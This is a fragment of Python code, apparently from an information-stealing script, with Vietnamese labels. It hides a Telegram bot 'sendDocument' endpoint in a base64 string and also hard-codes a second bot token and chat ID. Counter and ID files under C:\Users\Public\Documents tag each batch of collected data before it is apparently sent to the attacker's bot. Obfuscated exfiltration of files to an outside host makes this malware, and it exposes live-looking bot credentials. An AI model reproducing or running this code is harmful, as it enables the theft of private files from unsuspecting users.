...
crypt = base64.b64decode("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDYxMzYyODM3Nzk6QUFIYVZ5UWp5TDFlVXc4dFVvaS1iU3dnX29mWkpLWUhwb2Mvc2VuZERvY3VtZW50").decode('utf-8')
...
def demso() :
    path_demso = "C:\\Users\\Public\\Documents\\number.txt"
...
def id() :
    path_id = "C:\\Users\\Public\\Documents\\id.txt"
...
def main():
    number = "Data Về Lần Thứ " + str(demso())
    ...
    token = 'https://api.telegram.org/bot6725618281:AAE-454GL43osHQ6uhJByuimRtj0xcmSdrY/sendDocument'
    IDchat = '1170068034'
